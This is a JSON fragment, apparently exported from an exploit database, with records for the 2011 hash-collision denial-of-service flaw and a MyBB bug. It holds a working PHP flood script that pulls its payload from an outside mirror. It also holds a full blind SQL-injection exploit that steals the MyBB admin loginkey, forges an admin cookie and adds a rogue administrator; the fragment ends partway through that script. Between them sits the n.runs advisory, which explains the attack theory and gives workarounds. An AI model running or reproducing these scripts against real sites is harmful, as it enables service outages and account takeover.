            "bulletinFamily": "exploit",
            "description": "PHP Hashtables Denial of Service. CVE-2011-4885. Dos exploit for php platform",
            "modified": "2012-01-01T00:00:00",
            "published": "2012-01-01T00:00:00",
            "id": "EDB-ID:18296",
            "href": "https://www.exploit-db.com/exploits/18296/",
            "type": "exploitdb",
            "title": "PHP Hashtables Denial of Service",
            "sourceData": "  \r\n\r\n# Exploit Title: CVE-2011-4885 PHP Hashtables Denial of Service\r\nExploit\r\n # Date: 1/1/12\r\n # Author: infodox\r\n # Software Link: php.net\r\n #\r\nVersion: 5.3.*\r\n # Tested on: Linux\r\n # CVE : CVE-2011-4885 \r\n\r\nExploit\r\nDownload -- http://infodox.co.cc/Downloads/phpdos.txt \r\n\r\n<?php\r\n/*\r\nPHP 5.3.* Hash Colission DoS Exploit by infodox\r\nOriginal version by itz me (opensc.ws)\r\nCVE-2011-4885\r\n\r\nMirrors List:\r\nhttps://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/18296.txt (hashcollide.txt)\r\nhttp://compsoc.nuigalway.ie/~infodox/hashcollide.txt\r\nhttp://jrs-s.net/hashcollide.txt\r\nhttp://www.infodox.co.cc/Downloads/hashcollide.txt\r\n\r\nChanges:\r\nDifferent mirror for hashcollide.txt\r\nNow takes target as a command line argument\r\nStatus message printing\r\n\r\nTwitter: @info_dox\r\nBlog: blog.infodox.co.cc\r\nSite: http://www.infodox.co.cc/\r\n*/\r\n$targ = $argv[1];\r\n$x = file_get_contents(\"http://jrs-s.net/hashcollide.txt\"); // if this doesnt work replace with the mirrors_lst ones...\r\nwhile(1) {\r\n echo \"firing\";\r\n $ch = curl_init(\"$targ\");\r\n curl_setopt($ch, CURLOPT_POSTFIELDS, $x);\r\n curl_exec($ch);\r\n curl_close($ch);\r\n echo \"[+] Voly Sent!\";\r\n}\r\n?>",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:18296"
        },
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 51193\r\nCVE ID: CVE-2011-4885\r\n\r\n\r\nPHP 5.3.9\u4e4b\u524d\u7248\u672c\u5728\u8ba1\u7b97\u8868\u5355\u53c2\u6570\u54c8\u5e0c\u503c\u7684\u5b9e\u73b0\u4e0a\u6ca1\u6709\u63d0\u524d\u9650\u5236\u54c8\u5e0c\u51b2\u7a81\uff0c\u5b58\u5728\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e\uff0c\u901a\u8fc7\u53d1\u9001\u5c0f\u91cf\u7684\u7279\u5236webform\u8868\u5355\u5f20\u8d34\u5230\u53d7\u5f71\u54cd\u5e94\u7528\u7a0b\u5e8f\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u6b64\u6f0f\u6d1e\u5bfc\u81f4\u4f7f\u7528PHP\u7684\u7ad9\u70b9\u5931\u53bb\u54cd\u5e94\u6b63\u5e38\u8bf7\u6c42\u7684\u80fd\u529b\n0\nPHP 5.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nPHP\r\n---\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://www.php.net",
            "modified": "2012-01-01T00:00:00",
            "published": "2012-01-01T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-30001",
            "id": "SSV:30001",
            "type": "seebug",
            "title": "PHP Web\u8868\u5355\u54c8\u5e0c\u51b2\u7a81\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e",
            "sourceData": "",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:30001"
        },
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2011-12-29T00:00:00",
            "published": "2011-12-29T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-26121",
            "id": "SSV:26121",
            "type": "seebug",
            "title": "Multiple Programming Language Implementations Vulnerable to Hash Table Collision Attacks",
            "sourceData": "\n                                                US-CERT is aware of reports stating that multiple programming language implementations, including web platforms, are vulnerable to hash table collision attacks. This vulnerability could be used by an attacker to launch a denial-of-service attack against websites using affected products. \r\n\r\nThe Ruby Security Team has updated Ruby 1.8.7. The Ruby 1.9 series is not affected by this attack. Additional information can be found in the ruby 1.8.7 patchlevel 357 release notes.\r\n\r\nMicrosoft has released a security advisory for ASP.NET containing a workaround. Additional information can be found in Microsoft Security Advisory 2659883.\r\n\r\nMore information regarding this vulnerability can be found in US-CERT Vulnerability Note VU#903934 and n.runs Security Advisory n.runs-SA-2011.004.\r\n\r\n---\r\nsebug\r\n\r\n\u76ee\u524d\u5df2\u77e5\u7684\u53d7\u5f71\u54cd\u7684\u8bed\u8a00\u4ee5\u53ca\u7248\u672c\u6709::\r\nJava, \u6240\u6709\u7248\u672c\r\nJRuby &lt;= 1.6.5\r\nPHP &lt;= 5.3.8, &lt;= 5.4.0RC3\r\nPython, \u6240\u6709\u7248\u672c\r\nRubinius, \u6240\u6709\u7248\u672c\r\nRuby &lt;= 1.8.7-p356\r\nApache Geronimo, \u6240\u6709\u7248\u672c\r\nApache Tomcat &lt;= 5.5.34, &lt;= 6.0.34, &lt;= 7.0.22\r\nOracle Glassfish &lt;= 3.1.1\r\nJetty, \u6240\u6709\u7248\u672c\r\nPlone, \u6240\u6709\u7248\u672c\r\nRack, \u6240\u6709\u7248\u672c\r\nV8 JavaScript Engine, \u6240\u6709\u7248\u672c\r\n\r\n\u4e0d\u53d7\u6b64\u5f71\u54cd\u7684\u8bed\u8a00\u6216\u8005\u4fee\u590d\u7248\u672c\u7684\u8bed\u8a00\u6709::\r\nPHP &gt;= 5.3.9, &gt;= 5.4.0RC4\r\nJRuby &gt;= 1.6.5.1\r\nRuby &gt;= 1.8.7-p357, 1.9.x\r\nApache Tomcat &gt;= 5.5.35, &gt;= 6.0.35, &gt;= 7.0.23\r\nOracle Glassfish, N/A (Oracle reports that the issue is fixed in the main codeline and scheduled for a future CPU)\r\n\r\nCVE: CVE-2011-4885 (PHP), CVE-2011-4461 (Jetty), CVE-2011-4838 (JRuby), CVE-2011-4462 (Plone), CVE-2011-4815 (Ruby)\r\n\r\n---\r\n\r\n===================================\r\n\r\nn.runs AG\r\nhttp://www.nruns.com/                              security(at)nruns.com\r\nn.runs-SA-2011.004                                           28-Dec-2011\r\n________________________________________________________________________\r\nVendors: PHP, http://www.php.net\r\n                    Oracle, http://www.oracle.com\r\n                    Microsoft, http://www.microsoft.com\r\n                    Python, http://www.python.org\r\n                    Ruby, http://www.ruby.org\r\n                    Google, http://www.google.com\r\nAffected Products: PHP 4 and 5\r\n                    Java\r\n                    Apache Tomcat\r\n                    Apache Geronimo\r\n                    Jetty\r\n                    Oracle Glassfish\r\n                    ASP.NET\r\n                    Python\r\n                    Plone\r\n                    CRuby 1.8, JRuby, Rubinius \r\n                    v8\r\nVulnerability:      Denial of Service through hash table\r\n                    multi-collisions\r\nTracking IDs:       oCERT-2011-003\r\n                    CERT VU#903934\r\n________________________________________________________________________\r\nVendor communication:\r\n2011/11/01 Coordinated notification to PHP, Oracle, Python, Ruby, Google\r\n           via oCERT\r\n2011/11/29 Coordinated notification to Microsoft via CERT\r\n\r\nVarious communication with the vendors for clarifications, distribution\r\nof PoC code, discussion of fixes, etc.\r\n___________________________________________________________________________\r\nOverview:\r\n\r\nHash tables are a commonly used data structure in most programming\r\nlanguages. Web application servers or platforms commonly parse\r\nattacker-controlled POST form data into hash tables automatically, so\r\nthat they can be accessed by application developers.\r\n\r\nIf the language does not provide a randomized hash function or the\r\napplication server does not recognize attacks using multi-collisions, an\r\nattacker can degenerate the hash table by sending lots of colliding\r\nkeys. The algorithmic complexity of inserting n elements into the table\r\nthen goes to O(n**2), making it possible to exhaust hours of CPU time\r\nusing a single HTTP request.\r\n\r\nThis issue has been known since at least 2003 and has influenced Perl\r\nand CRuby 1.9 to change their hash functions to include randomization.\r\n\r\nWe show that PHP 5, Java, ASP.NET as well as v8 are fully vulnerable to\r\nthis issue and PHP 4, Python and Ruby are partially vulnerable,\r\ndepending on version or whether the server running the code is a 32 bit\r\nor 64 bit machine.\r\n\r\nDescription:\r\n\r\n= Theory =\r\n\r\nMost hash functions used in hash table implementations can be broken\r\nfaster than by using brute-force techniques (which is feasible for hash\r\nfunctions with 32 bit output, but very expensive for 64 bit functions)\r\nby using one of two \u201ctricks\u201d: equivalent substrings or a\r\nmeet-in-the-middle attack.\r\n\r\n== Equivalent substrings ==\r\n\r\nSome hash functions have the property that if two strings collide, e.g.\r\nhash('string1') = hash('string2'), then hashes having this substring at\r\nthe same position collide as well, e.g. hash('prefixstring1postfix') =\r\nhash('prefixstring2postfix'). If for example 'Ez' and 'FY' collide under\r\na hash function with this property, then 'EzEz', 'EzFY', 'FYEz', 'FYFY'\r\ncollide as well. An observing reader may notice that this is very\r\nsimilar to binary counting from zero to four. Using this knowledge, an\r\nattacker can construct arbitrary numbers of collisions (2^n for\r\n2*n-sized strings in this example).\r\n\r\n== Meet-in-the-middle attack ==\r\n\r\nIf equivalent substrings are not present in a given hash function, then\r\nbrute-force seems to be the only solution. The obvious way to best use\r\nbrute-force would be to choose a target value and hash random\r\n(fixed-size) strings and store those which hash to the target value. For\r\na non-biased hash function with 32 bit output length, the probability of\r\nhitting a target in this way is 1/(2^32).\r\n\r\nA meet-in-the-middle attack now tries to hit more than one target at a\r\ntime. If the hash function can be inverted and the internal state of the\r\nhash function has the same size as the output, one can split the string\r\ninto two parts, a prefix (of size n) and a postfix (of size m). One can\r\nnow iterate over all possible m-sized postfix strings and calculate the\r\nintermediate value under which the hash function maps to a certain\r\ntarget. If one stores these strings and corresponding intermediate value\r\nin a lookup table, one can now generate random n-sized prefix strings\r\nand see if they map to one of the intermediate values in the lookup\r\ntable. If this is the case, the complete string will map to the target\r\nvalue.\r\n\r\nSplitting in the middle reduces the complexity of this attack by the\r\nsquare root, which gives us the probability of 1/(2^16) for a collision,\r\nthus enabling an attacker to generate multi-collisions much faster.\r\n\r\nThe hash functions we looked at which were vulnerable to an equivalent\r\nsubstring attack were all vulnerable to a meet-in-the-middle attack as\r\nwell. In this case, the meet-in-the-middle attack provides more\r\ncollisions for strings of a fixed size than the equivalent substring\r\nattack.\r\n\r\n= The real world =\r\n\r\nThe different language use different hash functions which suffer from\r\ndifferent problems. They also differ in how they use hash tables in\r\nstoring POST form data.\r\n\r\n== PHP 5 ==\r\n\r\nPHP 5 uses the DJBX33A (Dan Bernstein's times 33, addition) hash\r\nfunction and parses POST form data into the $_POST hash table. Because\r\nof the structure of the hash function, it is vulnerable to an equivalent\r\nsubstring attack.\r\n\r\nThe maximal POST request size is typically limited to 8 MB, which when\r\nfilled with a set of multi-collisions would consume about four hours of\r\nCPU time on an i7 core. Luckily, this time can not be exhausted because\r\nit is limited by the max_input_time (default configuration: -1,\r\nunlimited), Ubuntu and several BSDs: 60 seconds) configuration\r\nparameter. If the max_input_time parameter is set to -1 (theoretically:\r\nunlimited), it is bound by the max_execution_time configuration\r\nparameter (default value: 30).\r\n\r\nOn an i7 core, the 60 seconds take a string of multi-collisions of about\r\n500k. 30 seconds of CPU time can be generated using a string of about\r\n300k. This means that an attacker needs about 70-100kbit/s to keep one\r\ni7 core constantly busy. An attacker with a Gigabit connection can keep\r\nabout 10.000 i7 cores busy.\r\n\r\n== ASP.NET ==\r\n\r\nASP.NET uses the Request.Form object to provide POST data to a web\r\napplication developer. This object is of class NameValueCollection. This\r\nuses a different hash function than the standard .NET one, namely\r\nCaseInsensitiveHashProvider.getHashCode(). This is the DJBX33X (Dan\r\nBernstein's times 33, XOR) hash function on the uppercase version of the\r\nkey, which is breakable using a meet-in-the-middle attack.\r\n\r\nCPU time is limited by the IIS webserver to a value of typically 90\r\nseconds. This allows an attacker with about 30kbit/s to keep one Core2\r\ncore constantly busy. An attacker with a Gigabit connection can keep\r\nabout 30.000 Core2 cores busy.\r\n\r\n== Java ==\r\n\r\nJava offers the HashMap and Hashtable classes, which use the\r\nString.hashCode() hash function. It is very similar to DJBX33A (instead\r\nof 33, it uses the multiplication constant 31 and instead of the start\r\nvalue 5381 it uses 0). Thus it is also vulnerable to an equivalent\r\nsubstring attack. When hashing a string, Java also caches the hash value\r\nin the hash attribute, but only if the result is different from zero.\r\nThus, the target value zero is particularly interesting for an attacker\r\nas it prevents caching and forces re-hashing.\r\n\r\nDifferent web application parse the POST data differently, but the ones\r\ntested (Tomcat, Geronima, Jetty, Glassfish) all put the POST form data\r\ninto either a Hashtable or HashMap object. The maximal POST sizes also\r\ndiffer from server to server, with 2 MB being the most common.\r\n\r\nA Tomcat 6.0.32 server parses a 2 MB string of colliding keys in about\r\n44 minutes of i7 CPU time, so an attacker with about 6 kbit/s can keep\r\none i7 core constantly busy. If the attacker has a Gigabit connection,\r\nhe can keep about 100.000 i7 cores busy.\r\n\r\n== Python ==\r\n\r\nPython uses a hash function which is very similar to DJBX33X, which can\r\nbe broken using a meet-in-the-middle attack. It operates on register\r\nsize and is thus different for 64 and 32 bit machines. While generating\r\nmulti-collisions efficiently is also possible for the 64 bit version of\r\nthe function, the resulting colliding strings are too large to be\r\nrelevant for anything more than an academic attack.\r\n\r\nPlone as the most prominent Python web framework accepts 1 MB of POST\r\ndata, which it parses in about 7 minutes of CPU time in the worst case.\r\nThis gives an attacker with about 20 kbit/s the possibility to keep one\r\nCore Duo core constantly busy. If the attacker is in the position to\r\nhave a Gigabit line available, he can keep about 50.000 Core Duo cores\r\nbusy.\r\n\r\n== Ruby ==\r\n\r\nThe Ruby language consists of several implementations which do not share\r\nthe same hash functions. It also differs in versions (1.8, 1.9), which \u2212\r\ndepending on the implementation \u2212 also do not necessarily share the same\r\nhash function.\r\n\r\nThe hash function of CRuby 1.9 has been using randomization since 2008\r\n(a result of the algorithmic complexity attacks disclosed in 2003). The\r\nCRuby 1.8 function is very similar to DJBX33A, but the large\r\nmultiplication constant of 65599 prevents an effective equivalent\r\nsubstring attack. The hash function can be easily broken using a meet-\r\nin-the-middle attack, though. JRuby uses the CRuby 1.8 hash function for\r\nboth 1.8 and 1.9. Rubinius uses a different hash function but also does\r\nnot randomize it.\r\n\r\nA typical POST size limit in Ruby frameworks is 2 MB, which takes about\r\n6 hours of i7 CPU time to parse. Thus, an attacker with a single 850\r\nbits/s line can keep one i7 core busy. The other way around, an attacker\r\nwith a Gigabit connection can keep about 1.000.000 (one million!) i7\r\ncores busy.\r\n\r\n== v8 ==\r\n\r\nGoogle's Javascript implementation v8 uses a hash function which looks\r\ndifferent from the ones seen before, but can be broken using a meet-in-\r\nthe-middle attack, too.\r\n\r\nNode.js uses v8 to run Javascript-based web applications. The\r\nquerystring module parses POST data into a hash table structure.\r\n\r\nAs node.js does not limit the POST size by default (we assume this would\r\ntypically be the job of a framework), no effectiveness/efficiency\r\nmeasurements were performed.\r\n\r\nImpact:\r\n\r\nAny website running one of the above technologies which provides the\r\noption to perform a POST request is vulnerable to very effective DoS\r\nattacks.\r\n\r\nAs the attack is just a POST request, it could also be triggered from\r\nwithin a (third-party) website. This means that a cross-site-scripting\r\nvulnerability on a popular website could lead to a very effective DDoS\r\nattack (not necessarily against the same website).\r\n\r\nFixes:\r\n\r\nThe Ruby Security Team was very helpful in addressing this issue and\r\nboth CRuby and JRuby provide updates for this issue with a randomized\r\nhash function (CRuby 1.8.7-p357, JRuby 1.6.5.1, CVE-2011-4815).\r\n\r\nOracle has decided there is nothing that needs to be fixed within Java\r\nitself, but will release an updated version of Glassfish in a future CPU\r\n(Oracle Security ticket S0104869).\r\n\r\nTomcat has released updates (7.0.23, 6.0.35) for this issue which limit\r\nthe number of request parameters using a configuration parameter. The\r\ndefault value of 10.000 should provide sufficient protection.\r\n\r\nWorkarounds:\r\n\r\nFor languages were no fixes have been issued (yet?), there are a number\r\nof workarounds.\r\n\r\n= Limiting CPU time =\r\n\r\nThe easiest way to reduce the impact of such an attack is to reduce the\r\nCPU time that a request is allowed to take. For PHP, this can be\r\nconfigured using the max_input_time parameter. On IIS (for ASP.NET),\r\nthis can be configured using the \u201cshutdown time limit for processes\u201d\r\nparameter.\r\n\r\n= Limiting maximal POST size =\r\n\r\nIf you can live with the fact that users can not put megabytes of data\r\ninto your forms, limiting the form size to a small value (in the 10s of\r\nkilobytes rather than the usual megabytes) can drastically reduce the\r\nimpact of the attack as well.\r\n\r\n= Limiting maximal number of parameters =\r\n\r\nThe updated Tomcat versions offer an option to reduce the amount of\r\nparameters accepted independent from the maximal POST size. Configuring\r\nthis is also possible using the Suhosin version of PHP using the\r\nsuhosin.{post|request}.max_vars parameters.\r\n\r\n________________________________________________________________________\r\nCredits:\r\nAlexander Klink, n.runs AG\r\nJulian W\u00e4lde, Technische Universit\u00e4t Darmstadt\r\n\r\nThe original theory behind this attack vector is described in the 2003\r\nUsenix Security paper \u201cDenial of Service via Algorithmic Complexity\r\nAttacks\u201d by Scott A. Crosby and Dan S. Wallach, Rice University\r\n________________________________________________________________________\r\nReferences:\r\nThis advisory and upcoming advisories:\r\nhttp://www.nruns.com/security_advisory.php\r\n________________________________________________________________________\r\nAbout n.runs:\r\nn.runs AG is a vendor-independent consulting company specialising in the\r\nareas of: IT Infrastructure, IT Security and IT Business Consulting.\r\n\r\nCopyright Notice:\r\nUnaltered electronic reproduction of this advisory is permitted. For all\r\nother reproduction or publication, in printing or otherwise, contact\r\nsecurity@nruns.com for permission. Use of the advisory constitutes\r\nacceptance for use in an \u201cas is\u201d condition. All warranties are excluded.\r\nIn no event shall n.runs be liable for any damages whatsoever including\r\ndirect, indirect, incidental, consequential, loss of business profits or\r\nspecial damages, even if n.runs has been advised of the possibility of\r\nsuch damages.\r\nCopyright 2011 n.runs AG. All rights reserved. Terms of use apply.\n                              ",
            "cvss": {
                "score": 7.8,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:26121"
        },
        {
            "bulletinFamily": "exploit",
            "description": "MyBulletinBoard (MyBB). CVE-2006-3775,CVE-2011-4084,CVE-2011-4858,CVE-2011-4885,CVE-2011-5034,CVE-2011-5035. Webapps exploit for php platform",
            "modified": "2006-07-15T00:00:00",
            "published": "2006-07-15T00:00:00",
            "id": "EDB-ID:2012",
            "href": "https://www.exploit-db.com/exploits/2012/",
            "type": "exploitdb",
            "title": "MyBulletinBoard MyBB <= 1.1.5 - CLIENT-IP SQL Injection Exploit",
            "sourceData": "#!/usr/bin/php -q -d short_open_tag=on\r\n<?\r\necho \"MyBulletinBoard (MyBB) <= 1.1.5 'CLIENT-IP' SQL injection / create new admin exploit\\n\";\r\necho \"by rgod rgod@autistici.org\\n\";\r\necho \"site: http://retrogod.altervista.org\\n\";\r\necho \"dork, version specific: \\\"Powered By MyBB\\\" \\\"2006 MyBB Group\\\"\\n\\n\";\r\n/*\r\nworks regardless of php.ini settings\r\n*/\r\nif ($argc<3) {\r\necho \"Usage: php \".$argv[0].\" host path OPTIONS\\n\";\r\necho \"host:      target server (ip/hostname)\\n\";\r\necho \"path:      path to MyBB\\n\";\r\necho \"Options:\\n\";\r\necho \"   -T[prefix]   specify a table prefix different from default (mybb_)\\n\";\r\necho \"   -u[number]   specify a user id other than 1 (usually admin)\\n\";\r\necho \"   -p[port]:    specify a port other than 80\\n\";\r\necho \"   -P[ip:port]: specify a proxy\\n\";\r\necho \"   -d:          disclose table prefix (reccomended)\\n\";\r\necho \"Example:\\r\\n\";\r\necho \"php \".$argv[0].\" localhost /MyBB/ -d\\r\\n\";\r\necho \"php \".$argv[0].\" localhost /MyBB/ -Tmy_\\r\\n\";\r\ndie;\r\n}\r\n/* software site: http://www.mybboard.com/\r\n\r\n   vulnerable code in inc/functions.php near lines 1292-1320:\r\n\r\n   ...\r\n   function getip() {\r\n\tglobal $_SERVER;\r\n\tif($_SERVER['HTTP_X_FORWARDED_FOR'])\r\n\t{\r\n\t\tif(preg_match_all(\"#[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}#s\", $_SERVER['HTTP_X_FORWARDED_FOR'], $addresses))\r\n\t\t{\r\n\t\t\twhile(list($key, $val) = each($addresses[0]))\r\n\t\t\t{\r\n\t\t\t\tif(!preg_match(\"#^(10|172\\.16|192\\.168)\\.#\", $val))\r\n\t\t\t\t{\r\n\t\t\t\t\t$ip = $val;\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\tif(!$ip)\r\n\t{\r\n\t\tif($_SERVER['HTTP_CLIENT_IP'])\r\n\t\t{\r\n\t\t\t$ip = $_SERVER['HTTP_CLIENT_IP'];\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\t$ip = $_SERVER['REMOTE_ADDR'];\r\n\t\t}\r\n\t}\r\n\treturn $ip;\r\n}\r\n...\r\n\r\nyou can spoof your ip address through the CLIENT-IP http header...\r\nas result you can inject sql statements in class_session.php at lines 36-68:\r\nby calling the main index.php script\r\n...\r\nfunction init()\r\n\t{\r\n\t\tglobal $ipaddress, $db, $mybb, $noonline;\r\n\t\t//\r\n\t\t// Get our visitors IP\r\n\t\t//\r\n\t\t$this->ipaddress = $ipaddress = getip();\r\n\r\n\t\t//\r\n\t\t// User-agent\r\n\t\t//\r\n\t\t$this->useragent = $_SERVER['HTTP_USER_AGENT'];\r\n\t\tif(strlen($this->useragent) > 100)\r\n\t\t{\r\n\t\t\t$this->useragent = substr($this->useragent, 0, 100);\r\n\t\t}\r\n\r\n\t\t//\r\n\t\t// Attempt to find a session id in the cookies\r\n\t\t//\r\n\t\tif($_COOKIE['sid'])\r\n\t\t{\r\n\t\t\t$this->sid = addslashes($_COOKIE['sid']);\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\t$this->sid = 0;\r\n\t\t}\r\n\r\n\t\t//\r\n\t\t// Attempt to load the session from the database\r\n\t\t//\r\n\t\t$query = $db->query(\"SELECT sid,uid FROM \".TABLE_PREFIX.\"sessions WHERE sid='\".$this->sid.\"' AND ip='\".$this->ipaddress.\"'\");\r\n...\r\n\r\ninjection is blind, but you can ask true-false questions to the database to\r\nretrieve the admin loginkey.\r\nThrough that you can build an admin cookie and create a new admin user through\r\nthe admin/users.php script.\r\nAlso you can disclose table prefix.\r\n\r\n--------------------------------------------------------------------------------\r\n\r\n\r\n-*****************************************************************************-\r\n*                                                                            *\r\n* Italia - Germania 2-0, al 114' forse il pi\u0102\u0161 bel gol che abbia mai visto    *\r\n* grazie Grosso!                                                             *\r\n*                                                                            *\r\n-*****************************************************************************-\r\n */\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nfunction quick_dump($string)\r\n{\r\n  $result='';$exa='';$cont=0;\r\n  for ($i=0; $i<=strlen($string)-1; $i++)\r\n  {\r\n   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))\r\n   {$result.=\"  .\";}\r\n   else\r\n   {$result.=\"  \".$string[$i];}\r\n   if (strlen(dechex(ord($string[$i])))==2)\r\n   {$exa.=\" \".dechex(ord($string[$i]));}\r\n   else\r\n   {$exa.=\" 0\".dechex(ord($string[$i]));}\r\n   $cont++;if ($cont==15) {$cont=0; $result.=\"\\r\\n\"; $exa.=\"\\r\\n\";}\r\n  }\r\n return $exa.\"\\r\\n\".$result;\r\n}\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.$host.':'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n   $c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n   }\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n  #debug\r\n  #echo \"\\r\\n\".$html;\r\n}\r\n\r\nfunction make_seed()\r\n{\r\n   list($usec, $sec) = explode(' ', microtime());\r\n   return (float) $sec + ((float) $usec * 100000);\r\n}\r\nsrand(make_seed());\r\n$anumber = rand(1,99999);\r\n\r\n$host=$argv[1];\r\n$path=$argv[2];\r\n$port=80;\r\n$prefix=\"mybb_\";\r\n$user_id=\"1\";//admin\r\n$proxy=\"\";\r\n$dt=0;\r\nfor ($i=3; $i<$argc; $i++){\r\n$temp=$argv[$i][0].$argv[$i][1];\r\nif ($temp==\"-p\")\r\n{\r\n  $port=str_replace(\"-p\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-P\")\r\n{\r\n  $proxy=str_replace(\"-P\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-T\")\r\n{\r\n  $prefix=str_replace(\"-T\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-u\")\r\n{\r\n  $user_id=str_replace(\"-u\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-d\")\r\n{\r\n  $dt=1;\r\n}\r\n}\r\nif (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n\r\nif ($dt)\r\n{\r\n$sql=\"'suntzuuuu/*\";\r\necho \"sql -> \".$sql.\"\\r\\n\";\r\n$packet =\"GET \".$p.\"index.php HTTP/1.0\\r\\n\";\r\n$packet.=\"CLIENT-IP: $sql\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\nif (eregi(\"You have an error in your SQL syntax\",$html))\r\n{\r\n $temp=explode(\"sessions\",$html);\r\n $temp2=explode(\" \",$temp[0]);\r\n $prefix=$temp2[count($temp2)-1];\r\n echo \"prefix -> \".$prefix;if ($prefix==\"\"){echo \"[no prefix]\";}echo\"\\n\";\r\n}\r\nelse\r\n{\r\necho \"unable to disclose table prefix...\\n\";\r\n}\r\nsleep(1);\r\n}\r\n\r\n$chars[0]=0;//null\r\n$chars=array_merge($chars,range(48,57)); //numbers\r\n$chars=array_merge($chars,range(65,90));//A-Z letters\r\n$chars=array_merge($chars,range(97,122));//a-f letters\r\n$j=1;\r\n$loginkey=\"\";\r\nwhile (!strstr($loginkey,chr(0)))\r\n{\r\nfor ($i=0; $i<=255; $i++)\r\n{\r\nif (in_array($i,$chars))\r\n{\r\n$sql=\"99999999' UNION SELECT ASCII(SUBSTRING(loginkey,\".$j.\",1))=\".$i.\",0 FROM \".$prefix.\"users WHERE uid=1/*\";\r\necho \"sql -> \".$sql.\"\\r\\n\";\r\n$packet =\"GET \".$p.\"index.php HTTP/1.0\\r\\n\";\r\n$packet.=\"CLIENT-IP: $sql\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\nif (eregi(\"Hello There\",$html)) {$loginkey.=chr($i);echo \"loginkey -> \".$loginkey.\"[???]\\r\\n\";sleep(1);break;}\r\n}\r\nif ($i==255) {die(\"Exploit failed...\");}\r\n}\r\n  $j++;\r\n}\r\n$cookie=\"mybbuser=1_\".trim(str_replace(chr(0),\"\",$loginkey)).\"; mybbadmin=1_\".trim(str_replace(chr(0),\"\",$loginkey)).\";\";\r\necho \"admin cookie -> \".$cookie.\"\\r\\n\";\r\n\r\n\r\n$data='-----------------------------7d62702f250530\r\nContent-Disposition: form-data; name=\"action\";\r\n\r\ndo_add\r\n-----------------------------7d62702f250530\r\nContent-Disposition: form-data; name=\"userusername\";\r\n\r\nsuntzu'.$anumber.'\r\n-----------------------------7d62702f250530\r\nContent-Disposition: form-data; name=\"newpassword\";\r\n\r\nsuntzu'.$anumber.'\r\n-----------------------------7d62702f250530\r\nContent-Disposition: form-data; name=\"email\";\r\n\r\nsuntzoi@suntzu.org\r\n-----------------------------7d62702f250530\r\nContent-Disposition: form-data; name=\"usergroup\";\r\n\r\n4\r\n-----------------------------7d62702f250530\r\nContent-Disposition: form-data; name=\"additionalgroups[]\";\r\n\r\n4\r\n-----------------------------7d62702f250530\r\nContent-Disposition: form-data; name=\"displaygroup\";\r\n\r\n4\r\n-----------------------------7d62702f250530\r\nContent-Disposition: form-data; name=\"Add User\";\r\n\r\n  Add User\r\n-----------------------------7d62702f250530--\r\n';\r\n\r\n$packet=\"POST \".$p.\"admin/users.php HTTP/1.0\\r\\n\";\r\n$packet.=\"User-Agent: 